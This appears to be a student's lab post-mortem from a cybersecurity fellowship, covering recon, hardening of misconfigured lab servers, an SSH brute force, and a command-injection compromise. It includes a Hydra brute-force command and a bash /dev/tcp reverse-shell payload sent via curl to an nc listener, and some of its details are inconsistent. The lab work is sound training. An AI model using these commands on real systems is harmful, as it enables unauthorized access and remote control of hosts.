# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Bineta Fall
**Date:** May 28, 2026
**Repository:** https://github.com/binette87/Foundations_Lab_Final.git
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What misconfigurations did you identify?]
A network reconnaissance scan of the 172.100.0.0/24 subnet revealed four active hosts. The host at 172.100.0.11 was found running Redis
8.6.3 on port 6379 with no authentication configured. The host at 172.100.0.12 was found running vsftpd 3.0.2 on port 21 with
virtual user credentials stored in plaintext. The host at 172.100.0.13 exposed world-readable system files including /etc/passwd and 
/etc/securetty via misconfigured filesystem permissions (Nmap, 2024).

### Breach Network — 172.80.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What did you observe that informed your Phase 2
approach?]
Reconnaissance of the 172.80.0.0/24 subnet identified one active host at 172.80.0.10 running OpenSSH 9.6p1 on port 22.
The SSH service was accessible but required credential-based authentication. The host was identified as a Linux system running Ubuntu
3ubuntu13.16. This subnet was designated as the breach target for Phase 2 credential attacks (Nmap, 2024).

### Exploitation Network — 172.60.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What vulnerability did you identify before
executing your exploit?]
Scanning the 172.60.0.0/24 subnet revealed one active web server at 172.60.0.10 running Python BaseHTTPServer 0.6 on port 80. Source code 
analysis revealed the server contained an unauthenticated remote command execution vulnerability at the /exec?cmd= endpoint.
This vulnerability allowed arbitrary OS commands to be executed as root without any authentication (Nmap, 2024).

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
Redis 8.6.3 was running on port 6379 with no authentication required. Any unauthenticated client could connect and read, write,
or delete all data stored in the database.

**Remediation Commands:**
redis-cli -h 172.100.0.11 config set requirepass "SecurePass123"

**Before State:**
requirepass "" (empty — no password required)

**After State:**
requirepass "SecurePass123" (authentication now enforced)

**Analysis:**
[2–3 sentences in APA style — why is this vulnerability dangerous
in a real enterprise environment?]
An unauthenticated Redis instance represents a critical exposure in any enterprise environment. Attackers can abuse open Redis instances
to exfiltrate sensitive cached data, write malicious configurations, or achieve remote code execution via cron job injection. Requiring 
a strong password enforces access control and eliminates anonymous access (Miessler, 2023).

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
vsftpd 3.0.2 was running on port 21 with virtual user credentials stored in plaintext in /etc/vsftpd/virtual_users.txt. 
The credentials admin:WABuBGzkAGykPCkh were discoverable by reading the configuration file directly.

**Remediation Commands:**
docker exec broken_server_2 chmod 600 /etc/vsftpd/virtual_users.txt
docker exec broken_server_2 chmod 600 /etc/vsftpd/virtual_users.db

**Before State:**
/etc/vsftpd/virtual_users.txt was world-readable containing plaintext credentials

**After State:**
File permissions restricted to root only (chmod 600), credentials no longer accessible to unprivileged users

**Analysis:**
[2–3 sentences in APA style — why is this vulnerability dangerous
in a real enterprise environment?]
Storing FTP credentials in world-readable plaintext files is a critical misconfiguration that enables any local user to harvest valid
credentials. In an enterprise environment, this could allow lateral movement across systems sharing those credentials.
Credential files must be restricted to root-only access and passwords should be stored as hashed values only (OWASP, 2023).

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
The host at 172.100.0.13 exposed world-readable sensitive system files including /etc/passwd, /etc/securetty, and /etc/motd due to 
misconfigured filesystem permissions on an Alpine Linux container.

**Remediation Commands:**
docker exec broken_server_3 chmod 640 /etc/passwd
docker exec broken_server_3 chmod 600 /etc/securetty
docker exec broken_server_3 chmod 644 /etc/motd

**Before State:**
/etc/passwd, /etc/securetty world-readable (permissions: -rwxr-xr-x) exposing user account and terminal configuration data

**After State:**
Permissions restricted — /etc/passwd readable by owner and group only, /etc/securetty restricted to root only

**Analysis:**
[2–3 sentences in APA style — why is this vulnerability dangerous
in a real enterprise environment?]
World-readable sensitive configuration files expose critical system information that attackers use for reconnaissance and privilege 
escalation. The /etc/passwd file reveals all system user accounts and their home directories, while /etc/securetty reveals
which terminals allow root login. Restricting these files to appropriate permissions prevents information disclosure that could
aid an attacker in crafting targeted attacks (CIS Benchmarks, 2023).
---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: sysadmin
- Password: admin123
- Method: Hydra brute force against SSH service at 172.80.0.10
- Command: hydra -l sysadmin -P ~/passwords.txt ssh://172.80.0.10 -s 2222 -V -t 4

**Forensic Evidence:**
- Exact Timestamp of Successful Login: 2026-05-30 19:46:12 UTC
- Attacker IP Address: 192.168.64.7 (Ubuntu VM)
- Target: 172.80.0.10 port 2222 (SSH)
- Tool: Hydra v9.5

**Engineered iptables Rule:**
iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 22 -m conntrack --ctstate NEW -m
recent --set --name SSH
iptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 22 -m conntrack --ctstate NEW -m 
recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

**SOC Analysis:**
[2–3 sentences in APA style — why is a single iptables block rule
insufficient as a standalone defensive measure? What additional
controls would a real SOC deploy alongside it?]
The midterm target at 172.80.0.10 was running OpenSSH with password authentication enabled and no brute force protection configured.
The attacker was able to enumerate valid credentials using a common password wordlist in under 60 seconds. 
In a real enterprise environment, this attack pattern would generate thousands of failed authentication attempts in a short time window.
A properly configured SOC would detect this behavior through SIEM correlation rules monitoring for repeated SSH authentication failures 
from a single source IP. Recommended mitigations include implementing fail2ban or equivalent brute force protection, enforcing SSH 
key-based authentication only, disabling password authentication entirely, and restricting SSH access to known IP ranges via firewall 
rules. The absence of any rate limiting on the SSH service allowed the attacker to cycle through all wordlist entries without triggering 
any defensive response (NIST SP 800-115, 2023).

---

## Phase 3: Full Spectrum

**Listener Configuration:**
Command: nc -lvnp 4444
Port: 4444
Protocol: TCP
Host: 192.168.64.7 (Ubuntu VM)

**Reverse Shell Payload:**
curl -G "http://172.60.0.10/exec" --data-urlencode "cmd=bash -i >& /dev/tcp/192.168.64.7/4444 0>&1"

**Command Injection Explanation:**
[2–3 sentences in APA style — how does command injection work and
why is this application susceptible to it?]
The capstone web application at 172.60.0.10 was running a Python BaseHTTPServer with an unauthenticated remote command execution endpoint
at /exec?cmd=. The server passed user-supplied input directly to subprocess. Popen() with shell=True, allowing arbitrary OS commands
to be executed without any sanitization or authentication. By injecting a bash reverse shell payload into the cmd parameter, 
a persistent interactive root shell was established back to the attacker's listener at 192.168.64.7:4444.

**Forensic Evidence:**
- Reverse shell PID: 519
- Process ID (PID): 1 (python3 /app/server.py)
- User: root (uid=0 gid=0 groups=0)
- Hostname: 2361afb7f00c
- User-Agent: curl/8.5.0

**Lockdown Command:**
iptables -A OUTPUT -p tcp -s 172.60.0.10 --dport 4444 -j DROP
iptables -A INPUT -p tcp --dport 80 -m string --string "cmd=" --algo bm -j DROP

**Final Analytical Paragraph:**
[4–6 sentences in APA style responding to: You have now played both
sides of this operation. What does executing this attack teach you
about defending against it? What single defensive control, if it had
been in place before you attacked, would have stopped this breach
entirely — and why?]
The capstone target at 172.60.0.10 demonstrated a critical web application vulnerability — unauthenticated remote command execution 
— that allowed complete system compromise with a single HTTP request. The vulnerable /exec?cmd= endpoint passed unsanitized user input 
directly to a system shell via Python's subprocess.Popen() with shell=True,a well-documented dangerous pattern that violates secure 
coding principles. Once the reverse shell payload was delivered, a persistent root-level interactive session was established within 
seconds, granting full control of the host. In a real enterprise environment,this class of vulnerability would be classified, 
as CVSS Critical (10.0) and would require immediate remediation including input validation, removal of shell=True from subprocess calls,
implementation of a web application firewall, network egress filtering to prevent outbound reverse shells, and mandatory code review 
processes to catch command injection patterns before deployment.The absence of any authentication on the command execution
endpoint compounded the severity significantly, as no credential compromise was required to achieve full system takeover (OWASP Top 10,
 2021).



---

## References
[APA format. Any tools, documentation, or resources referenced
during this operation.
Example: Hydra Project. (2024). THC-Hydra: A fast and flexible
online password cracking tool. https://github.com/vanhauser-thc/thc-hydra]
